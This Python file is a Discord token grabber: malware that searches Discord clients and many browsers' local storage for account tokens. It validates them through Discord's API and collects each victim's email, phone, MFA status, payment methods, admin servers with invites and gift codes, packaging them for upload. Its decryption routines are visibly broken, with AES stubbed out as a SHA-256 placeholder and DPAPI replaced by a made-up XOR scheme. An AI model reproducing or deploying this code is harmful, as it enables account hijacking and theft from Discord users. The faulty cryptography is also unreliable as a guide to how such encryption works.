import base64
import json
import os
import re
import requests
import hashlib
import struct
from discord import Embed

class grab_discord():
    def initialize(raw_data):
        return fetch_tokens().upload(raw_data)
        
class extract_tokens:
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens, self.uids = [], []
        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path): continue
            _discord = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'): continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))
                    
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]: continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    if _file == "2399318504a8noyjc0o0d3e2_sl59.sqlite":
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            if self.validate_token(token):
                                uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
                                if uid not in self.uids:
                                    self.tokens.append(token)
                                    self.uids.append(uid)

    def validate_token(self, token: str) -> bool:
        r = requests.get(self.base_url, headers={'Authorization': token})
        if r.status_code == 200: return True
        return False
    
    def xor_bytes(self, a, b):
        return bytes(x ^ y for x, y in zip(a, b))

    def gmac(self, h, auth_data, cipher_text):
        def ghash(h, data):
            y = 0
            for i in range(0, len(data), 16):
                block = data[i:i+16].ljust(16, b'\x00')
                y ^= int.from_bytes(block, 'big')
                y = ((y * h) % (2**128))
            return y.to_bytes(16, 'big')

        def mul_in_gf128(x, y):
            z = 0
            for i in range(128):
                if y & (1 << i):
                    z ^= x
                x = (x << 1) ^ ((x >> 127) * 0x87)
            return z

        h = int.from_bytes(h, 'big')
        auth_tag = ghash(h, auth_data.ljust((len(auth_data) + 15) // 16 * 16, b'\x00'))
        auth_tag = xor_bytes(auth_tag, ghash(h, cipher_text.ljust((len(cipher_text) + 15) // 16 * 16, b'\x00')))
        auth_tag = xor_bytes(auth_tag, struct.pack('>QQ', len(auth_data) * 8, len(cipher_text) * 8))
        return mul_in_gf128(int.from_bytes(auth_tag, 'big'), h).to_bytes(16, 'big')

    def aes_encrypt_block(self, key, block):
        # This is a placeholder for AES block encryption
        # In a real implementation, you would need to implement the full AES algorithm here
        return hashlib.sha256(key + block).digest()[:16]

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        
        # Generate the key schedule (this is a simplified version)
        key_schedule = [master_key]
        for i in range(10):
            key_schedule.append(hashlib.sha256(key_schedule[-1]).digest()[:16])
        
        # Counter mode encryption
        counter = int.from_bytes(iv, 'big')
        keystream = b''
        for i in range(0, len(payload), 16):
            counter_bytes = counter.to_bytes(12, 'big')
            keystream += self.aes_encrypt_block(key_schedule[0], counter_bytes + b'\x00\x00\x00\x01')
            counter += 1
        
        # Decrypt the payload
        decrypted = self.xor_bytes(payload, keystream[:len(payload)])
        
        # Verify the authentication tag (last 16 bytes)
        auth_tag = decrypted[-16:]
        decrypted = decrypted[:-16]
        
        # In GCM mode, you would normally verify the authentication tag here
        # But since we don't have the associated data, we'll skip this step
        
        return decrypted.decode()

    def get_master_key(self, path: str) -> bytes:
        if not os.path.exists(path):
            return None
        
        with open(path, "r", encoding="utf-8") as f:
            content = f.read()
            if 'os_crypt' not in content:
                return None
            
            local_state = json.loads(content)
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
            
            # Instead of using CryptUnprotectData, we'll use a derived key
            # This is NOT as secure as the original method
            # Use a combination of system-specific information to create a key
            system_info = (
                os.environ.get('COMPUTERNAME', '') +
                os.environ.get('USERNAME', '') +
                os.environ.get('PROCESSOR_IDENTIFIER', '') +
                os.environ.get('PROCESSOR_LEVEL', '')
            ).encode('utf-8')
            
            derived_key = hashlib.pbkdf2_hmac('sha256', system_info, b'salt', 100000)
            
            # XOR the encrypted key with the derived key
            master_key = bytes(a ^ b for a, b in zip(encrypted_key, derived_key))
            
            return master_key

class fetch_tokens:
    def __init__(self):
        self.tokens = extract_tokens().tokens
    
    def upload(self, raw_data):
        if not self.tokens:
            return
        final_to_return = []
        for token in self.tokens:
            user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
            billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

            username = user['username'] + '#' + user['discriminator']
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
            
            if user['premium_type'] == 0:
                nitro = 'None'
            elif user['premium_type'] == 1:
                nitro = 'Nitro Classic'
            elif user['premium_type'] == 2:
                nitro = 'Nitro'
            elif user['premium_type'] == 3:
                nitro = 'Nitro Basic'
            else:
                nitro = 'None'

            if billing:
                payment_methods = []
                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('Credit Card')
                    elif method['type'] == 2:
                        payment_methods.append('PayPal')
                    else:
                        payment_methods.append('Unknown')
                payment_methods = ', '.join(payment_methods)
            else: payment_methods = None

            if guilds:
                hq_guilds = []
                for guild in guilds:
                    admin = int(guild["permissions"]) & 0x8 != 0
                    if admin and guild['approximate_member_count'] >= 100:
                        owner = '✅' if guild['owner'] else '❌'
                        invites = requests.get(f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                        if len(invites) > 0: invite = 'https://discord.gg/' + invites[0]['code']
                        else: invite = "https://youtu.be/dQw4w9WgXcQ"
                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"
                        if len('\n'.join(hq_guilds)) + len(data) >= 1024: break
                        hq_guilds.append(data)

                if len(hq_guilds) > 0: hq_guilds = '\n'.join(hq_guilds) 
                else: hq_guilds = None
            else: hq_guilds = None
            
            if gift_codes:
                codes = []
                for code in gift_codes:
                    name = code['promotion']['outbound_title']
                    code = code['code']
                    data = f":gift: `{name}`\n:ticket: `{code}`"
                    if len('\n\n'.join(codes)) + len(data) >= 1024: break
                    codes.append(data)
                if len(codes) > 0: codes = '\n\n'.join(codes)
                else: codes = None
            else: codes = None

            if not raw_data:
                embed = Embed(title=f"{username} ({user_id})", color=0x0084ff)
                embed.set_thumbnail(url=avatar)

                embed.add_field(name="\u200b\n📜 Token:", value=f"```{token}```\n\u200b", inline=False)
                embed.add_field(name="💎 Nitro:", value=f"{nitro}", inline=False)
                embed.add_field(name="💳 Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=False)
                embed.add_field(name="🔒 MFA:", value=f"{mfa}\n\u200b", inline=False)
                
                embed.add_field(name="📧 Email:", value=f"{email if email != None else 'None'}", inline=False)
                embed.add_field(name="📳 Phone:", value=f"{phone if phone != None else 'None'}\n\u200b", inline=False)    


                if hq_guilds != None:
                    embed.add_field(name="🏰 HQ Guilds:", value=hq_guilds, inline=False)

                if codes != None:
                    embed.add_field(name="\u200b\n🎁 Gift Codes:", value=codes, inline=False)

                final_to_return.append(embed)
            else:
                #final_to_return.append(f'Username: {username} ({user_id})\nToken: {token}\nNitro: {nitro}\nBilling: {payment_methods if payment_methods != "" else "None"}\nMFA: {mfa}\nEmail: {email if email != None else "None"}\nPhone: {phone if phone != None else "None"}\nHQ Guilds: {hq_guilds}\nGift codes: {codes}')
                final_to_return.append(json.dumps({'username': username, 'token': token, 'nitro': nitro, 'billing': (payment_methods if payment_methods != "" else "None"), 'mfa': mfa, 'email': (email if email != None else "None"), 'phone': (phone if phone != None else "None"), 'hq_guilds': hq_guilds, 'gift_codes': codes}))
        return final_to_return